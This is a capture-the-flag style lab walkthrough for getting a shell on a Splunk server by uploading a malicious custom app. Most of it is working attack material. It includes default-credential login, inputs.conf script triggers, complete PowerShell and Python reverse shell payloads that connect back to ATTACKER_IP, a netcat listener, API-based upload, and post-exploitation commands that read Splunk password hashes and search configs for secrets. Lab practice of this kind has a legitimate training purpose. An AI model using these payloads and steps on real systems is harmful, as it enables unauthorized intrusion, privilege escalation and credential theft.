# Splunk Labs

## Lab 1: Custom Splunk Application → Reverse Shell

### Objective
Deploy a malicious Splunk application to achieve remote code execution on the target, then escalate or collect the flag.

---

### Step 1: Enumerate the Target

- [ ] Scan for Splunk services:
  ```bash
  nmap -sV -p 8000,8089 TARGET
  ```
- [ ] Browse to `http://TARGET:8000` — note version, edition (Free vs Enterprise)
- [ ] Try default creds: `admin:changeme`

---

### Step 2: Determine Target OS

- [ ] Check the Splunk dashboard — look for OS indicators in system info
- [ ] Or check via API if accessible:
  ```bash
  curl -k -u admin:changeme https://TARGET:8089/services/server/info | grep -i os
  ```
- [ ] This determines which payload files and inputs.conf you use

---

### Step 3: Create the App Directory Structure

```bash
mkdir -p splunk_shell/bin splunk_shell/default
```

---

### Step 4A: Write Payload Files — Windows Target

- [ ] Create `splunk_shell/default/inputs.conf`:
  ```ini
  [script://.\bin\run.bat]
  disabled = false
  interval = 10
  sourcetype = shell
  ```

> **PITFALL: Do NOT add inline comments to inputs.conf. Splunk's parser will break and your script will never execute. No trailing `# comment` on any line.**

- [ ] Create `splunk_shell/bin/run.bat`:
  ```batch
  @echo off
  PowerShell.exe -exec bypass -file "%~dp0run.ps1"
  ```

- [ ] Create `splunk_shell/bin/run.ps1` — replace `ATTACKER_IP` and `PORT`:
  ```powershell
  $client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);
  $stream = $client.GetStream();
  [byte[]]$bytes = 0..65535|%{0};
  while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
      $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
      $sendback = (iex $data 2>&1 | Out-String );
      $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
      $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
      $stream.Write($sendbyte,0,$sendbyte.Length);
      $stream.Flush()
  }
  $client.Close()
  ```

---

### Step 4B: Write Payload Files — Linux Target

- [ ] Create `splunk_shell/default/inputs.conf`:
  ```ini
  [script:///opt/splunk/etc/apps/splunk_shell/bin/rev.py]
  disabled = false
  interval = 10
  sourcetype = shell
  ```

> **PITFALL: The path in inputs.conf MUST be absolute on Linux. Relative paths will not resolve.**

- [ ] Create `splunk_shell/bin/rev.py` — replace `ATTACKER_IP` and `PORT`:
  ```python
  import sys,socket,os,pty

  s=socket.socket()
  s.connect(("ATTACKER_IP",PORT))
  [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
  pty.spawn("/bin/bash")
  ```

---

### Step 5: Package the Application

- [ ] From the directory containing `splunk_shell/`:
  ```bash
  tar -czf splunk_shell.tar.gz splunk_shell/
  ```
- [ ] Verify the archive structure is correct:
  ```bash
  tar -tzf splunk_shell.tar.gz
  ```
  Expected output:
  ```
  splunk_shell/
  splunk_shell/bin/
  splunk_shell/bin/rev.py        (or run.bat + run.ps1)
  splunk_shell/default/
  splunk_shell/default/inputs.conf
  ```

---

### Step 6: Start Your Listener

> **PITFALL: Start the listener BEFORE uploading the app. The script fires almost immediately after install — if the listener isn't ready, you miss the callback and have to re-upload or wait for the next interval.**

- [ ] Start netcat listener:
  ```bash
  nc -nlvp PORT
  ```
- [ ] If using a port below 1024 (e.g., 443):
  ```bash
  sudo nc -nlvp 443
  ```

---

### Step 7: Upload the App

- [ ] In Splunk Web: **Settings → Apps → Install app from file**
- [ ] Click **Choose File**, select `splunk_shell.tar.gz`
- [ ] Click **Upload**

> **PITFALL: If paste doesn't work in the Splunk web UI file dialog, browser extensions like uBlock Origin may be interfering. Disable them or use a clean browser profile.**

- [ ] Alternative — upload via API (no browser needed):
  ```bash
  curl -k -u admin:changeme https://TARGET:8089/services/apps/local \
    -d "name=splunk_shell" --data-urlencode "filename=true" \
    -F "appfile=@splunk_shell.tar.gz"
  ```

---

### Step 8: Catch the Shell

- [ ] Check your listener — you should receive a connection within 10 seconds
- [ ] Verify access:
  ```bash
  whoami
  id
  hostname
  ```

---

### Step 9: Post-Exploitation

- [ ] Check if running as root:
  ```bash
  id
  ps aux | grep -i splunk
  ```
- [ ] Grab Splunk password hashes:
  ```bash
  cat /opt/splunk/etc/passwd
  ```
- [ ] Search for the flag:
  ```bash
  find / -name "flag.txt" 2>/dev/null
  cat /path/to/flag.txt
  ```
- [ ] Look for credentials in indexed data and configs:
  ```bash
  find /opt/splunk/etc/apps/ -name "*.conf" -exec grep -il "pass\|secret\|token" {} \;
  ```

---

### Troubleshooting Checklist

If you don't get a shell:

- [ ] Is the listener running? (`ss -tlnp | grep PORT`)
- [ ] Did you replace `ATTACKER_IP` and `PORT` in the payload?
- [ ] Can the target reach your attacker IP? (firewall, VPN, NAT issues)
- [ ] Is inputs.conf free of inline comments?
- [ ] Is the path in inputs.conf correct for the target OS?
- [ ] Check Splunk logs for errors:
  ```bash
  # On the target (if you have other access)
  tail -f /opt/splunk/var/log/splunk/splunkd.log
  ```
- [ ] Try re-uploading — Splunk may need an app restart:
  ```bash
  curl -k -u admin:changeme https://TARGET:8089/services/server/control/restart -X POST
  ```

---

### Key Takeaways

1. Splunk admin access = RCE via custom app upload. Always check for it.
2. The attack works on both Windows and Linux — just swap the payload and inputs.conf path style.
3. Splunk frequently runs as root on Linux, making this a direct privesc path.
4. The three things that will waste your time: inline comments in inputs.conf, forgetting to start the listener first, and wrong IP/port in the payload. Burn these into your brain.
